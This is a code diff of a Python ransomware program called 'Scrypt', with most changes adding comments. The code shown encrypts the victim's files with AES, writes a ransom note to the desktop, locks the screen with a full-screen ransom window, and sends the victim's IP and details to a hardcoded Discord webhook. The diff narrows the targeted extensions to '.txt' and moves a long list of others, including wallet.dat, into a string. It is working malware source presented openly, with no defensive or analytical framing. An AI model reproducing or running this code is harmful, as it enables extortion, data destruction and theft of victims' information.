@@ -12,11 +12,14 @@ from cryptography.hazmat.primitives import padding
 import os
 import shutil
 
+# Initialize global variables
 btcAdd = ""
 email = ""
 discordWebhook = "https://discord.com/api/webhooks/1213226208494624768/LaW1E7j2183RtaOqqfttCaQGvnOhEvi13Uu80L_UHgAmFeNXhDbAU3X-BMIWht5IP3Rk"
 
-fileTypes = ['.txt', '.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
+fileTypes = ['.txt']
+'''
+otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', '.wmv', '.csv', '.d3dbsp', '.sc2save',
              '.sie', '.sum', '.ibank', '.t13', '.t12', '.qdf', '.gdb', '.tax', '.pkpass', '.bc6', '.bc7', '.bkp', '.qic',
              '.bkf', '.sidn', '.sidd', '.mddata', '.itl', '.itdb', '.icxs', '.hvpl', '.hplg', '.hkdb', '.mdbackup',
              '.syncdb', '.gho', '.cas', '.svg', '.map', '.wmo', '.itm', '.sb', '.fos', '.mcgame', '.vdf', '.ztmp', '.sis',
@@ -39,7 +42,9 @@ fileTypes = ['.txt', '.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi
              '.ppsx', '.ppam', '.docb', '.mml', '.sxm', '.otg', '.slk', '.xlw', '.xlt', '.xlm', '.xlc', '.dif', '.stc', '.sxc',
              '.ots', '.ods', '.hwp', '.dotm', '.dotx', '.docm', '.DOT', '.max', '.xml', '.uot', '.stw', '.sxw', '.ott', '.csr',
              '.key', 'wallet.dat']
+'''
 
+#Define RW Class for functionality
 class Ransomware(PyQt5.QtCore.QRunnable):
     def __init__(self):
         super(Ransomware, self).__init__()
@@ -52,13 +57,15 @@ class Ransomware(PyQt5.QtCore.QRunnable):
         key = self.encryptionPass.encode()
         self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()
 
+    # Write ransomware note on victims desktop
     def readMe(self):
         try:
             with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f:
                 f.write(note)
         except Exception as e:
             print(f"Error writing readme.txt: {e}")
-
+            
+    # Retrieve details about victim's system
     def getUserDetails(self):
         try:
             self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
@@ -66,6 +73,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
         except Exception as e:
             print(f"Error getting user details: {e}")
 
+    #Encrypt file using AES Encryption
     def encryptFile(self, file):
         try:
             with open(file, 'rb') as infile:
@@ -76,6 +84,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
 
+    # Main method for ransomware functionality
     def run(self):
         self.sendMessage()
         for root, directories, files in os.walk(self.filePath):
@@ -87,6 +96,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):
 
         self.readMe()
 
+    # Send message to Discord Webhook with victim details 
     def sendMessage(self):
         try:
             self.getUserDetails()
@@ -114,15 +124,17 @@ class Ransomware(PyQt5.QtCore.QRunnable):
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
 
+    # Generate random string for encryption password
     def rSeed(self, stringLength):
         password_characters = string.ascii_letters
         return ''.join(random.choice(password_characters) for i in range(stringLength))
 
+    # Generate random string for unique ID
     def rID(self, stringLength):
         password_characters = string.ascii_letters + string.digits
         return ''.join(random.choice(password_characters) for i in range(stringLength))
 
-
+# Define class for main GUI of ransomware
 class Scrypt(PyQt5.QtWidgets.QMainWindow):
     def __init__(self):
         super().__init__() 
@@ -134,6 +146,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
         self.show()
         self.threadpool.start(Ransomware())
 
+    # Initiliaze the GUI
     def initUI(self):
         self.setWindowFlags(PyQt5.QtCore.Qt.WindowCloseButtonHint | PyQt5.QtCore.Qt.WindowType_Mask)
         self.showFullScreen()
@@ -143,7 +156,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
                         background-color: #212121;
                         }
                     """)  
-
+    # Add continue button to the GUI
     def cont(self):
         btn = PyQt5.QtWidgets.QPushButton('Continue', self)
         btn.resize(750, 50)
@@ -162,6 +175,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
         btn.show()
         btn.clicked.connect(self.hide)
 
+    # Display the ransom note on the GUI
     def readMe(self):
         rm = PyQt5.QtWidgets.QLabel(ransomNote, self) 
         rm.setStyleSheet("""
@@ -179,6 +193,7 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
         rm.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
         rm.show()
 
+    # Display the banner on the GUI
     def banner(self):
         self.flair = PyQt5.QtWidgets.QLabel('Scrypt', self) 
         self.flair.setStyleSheet("""
@@ -196,11 +211,12 @@ class Scrypt(PyQt5.QtWidgets.QMainWindow):
         self.flair.setAlignment(PyQt5.QtCore.Qt.AlignCenter)
         self.flair.show()
 
+    # Slot method to the HIDE the GUI
     @PyQt5.QtCore.pyqtSlot()
     def hide(self):
         self.setWindowOpacity(0)
 
-
+# Define ransom note and detailed ransom note 
 detailedNote = f"""
 -------------------------------------------------------------------------------------------------------------------------
 Hello,\n
@@ -233,7 +249,7 @@ UniqueID: {Ransomware().randomId}\n
 Click the Button Below To Continue:
 (Killing this program will result in a full loss of files)\n
 """
-
+# Entry point to the program
 if __name__ == "__main__":
     app = PyQt5.QtWidgets.QApplication(sys.argv)
     l = Scrypt()
